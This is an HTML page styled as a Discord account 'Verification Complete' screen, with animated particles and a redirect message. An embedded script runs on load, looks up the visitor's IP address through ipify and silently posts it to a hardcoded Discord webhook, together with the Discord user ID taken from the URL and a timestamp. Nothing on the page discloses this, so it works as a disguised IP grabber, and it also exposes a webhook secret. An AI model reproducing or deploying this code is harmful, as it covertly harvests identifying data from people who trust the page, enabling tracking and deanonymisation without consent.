<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verification Complete</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background: radial-gradient(circle at center, #1a0033 0%, #0a001a 70%, #000000 100%);
      color: #ffffff;
      font-family: 'Inter', Arial, sans-serif;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      overflow: hidden;
      position: relative;
    }

    /* Floating particles */
    .particles {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      pointer-events: none;
      overflow: hidden;
      z-index: 1;
    }

    .particle {
      position: absolute;
      background: rgba(255, 255, 255, 0.75);
      border-radius: 50%;
      animation: floatUp linear infinite;
      opacity: 0;
    }

    @keyframes floatUp {
      0% {
        transform: translateY(100vh) scale(0.6);
        opacity: 0;
      }
      10% {
        opacity: 0.6;
      }
      90% {
        opacity: 0.6;
      }
      100% {
        transform: translateY(-100px) scale(0.4);
        opacity: 0;
      }
    }

    .container {
      background: rgba(20, 10, 45, 0.65);
      backdrop-filter: blur(24px);
      -webkit-backdrop-filter: blur(24px);
      border: 1px solid rgba(180, 100, 255, 0.25);
      border-radius: 28px;
      padding: 70px 55px;
      width: 100%;
      max-width: 480px;
      text-align: center;
      box-shadow: 0 30px 70px -15px rgba(120, 50, 220, 0.4);
      position: relative;
      z-index: 2;
      animation: fadeInScale 1s cubic-bezier(0.23, 1, 0.32, 1) forwards;
    }

    @keyframes fadeInScale {
      from {
        opacity: 0;
        transform: scale(0.82) translateY(40px);
      }
      to {
        opacity: 1;
        transform: scale(1) translateY(0);
      }
    }

    .icon {
      width: 96px;
      height: 96px;
      background: rgba(160, 80, 255, 0.15);
      border: 3px solid #b46eff;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 auto 32px;
      box-shadow: 0 0 50px rgba(180, 110, 255, 0.5);
      animation: popIn 0.7s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
    }

    @keyframes popIn {
      0% { transform: scale(0.2); }
      70% { transform: scale(1.12); }
      100% { transform: scale(1); }
    }

    h1 {
      font-size: 46px;
      font-weight: 700;
      margin-bottom: 18px;
      background: linear-gradient(90deg, #d8b4ff, #b46eff, #e0bbff);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      text-shadow: 0 0 30px rgba(180, 110, 255, 0.5);
    }

    p {
      font-size: 18.5px;
      line-height: 1.65;
      opacity: 0.9;
      margin-bottom: 10px;
    }

    .return-text {
      margin-top: 45px;
      font-size: 15.5px;
      opacity: 0.65;
      letter-spacing: 0.5px;
    }

    /* Extra glow layer */
    .glow {
      position: absolute;
      top: -50%;
      left: -50%;
      width: 200%;
      height: 200%;
      background: radial-gradient(circle, rgba(180, 110, 255, 0.12) 0%, transparent 70%);
      pointer-events: none;
      z-index: -1;
      border-radius: 50%;
    }
  </style>
</head>
<body>
  <!-- Floating particles container -->
  <div class="particles" id="particles"></div>

  <div class="container">
    <div class="glow"></div>
    <div class="icon">
      <span style="font-size: 52px;">✅</span>
    </div>
    <h1>Verification Complete</h1>
    <p>You have successfully verified your account.</p>
    <p>You can now return to the Discord server.</p>
    
    <div class="return-text">
      Redirecting you shortly...
    </div>
  </div>

  <!-- IP + User ID Logging (COMPLETELY UNCHANGED) -->
  <script>
    const WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1521304967267352748/98SDkrBuIZ-vadcFIYGt5-igYech7LvaLnbGL1xnU1vJbprTRNyN_SWOLfH297O3KVwe";
    const urlParams = new URLSearchParams(window.location.search);
    const userId = urlParams.get('user_id') || 'unknown';

    fetch('https://api.ipify.org?format=json')
      .then(res => res.json())
      .then(data => {
        const ip = data.ip;
        fetch(WEBHOOK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            embeds: [{
              title: "🔍 Verification Log",
              color: 0xB46EFF,
              fields: [
                { name: "Discord User ID", value: userId, inline: true },
                { name: "IP Address", value: ip, inline: true },
                { name: "Time", value: new Date().toLocaleString(), inline: true }
              ]
            }]
          })
        });
      })
      .catch(() => {});
  </script>

  <!-- Floating particles script -->
  <script>
    function createParticles() {
      const container = document.getElementById('particles');
      for (let i = 0; i < 80; i++) {
        const particle = document.createElement('div');
        particle.classList.add('particle');
        
        const size = Math.random() * 3.5 + 1.5;
        particle.style.width = `${size}px`;
        particle.style.height = `${size}px`;
        
        particle.style.left = `${Math.random() * 100}vw`;
        particle.style.animationDuration = `${Math.random() * 8 + 9}s`;
        particle.style.animationDelay = `-${Math.random() * 15}s`;
        particle.style.opacity = Math.random() * 0.6 + 0.3;
        
        container.appendChild(particle);
      }
    }

    createParticles();
  </script>
</body>
</html>
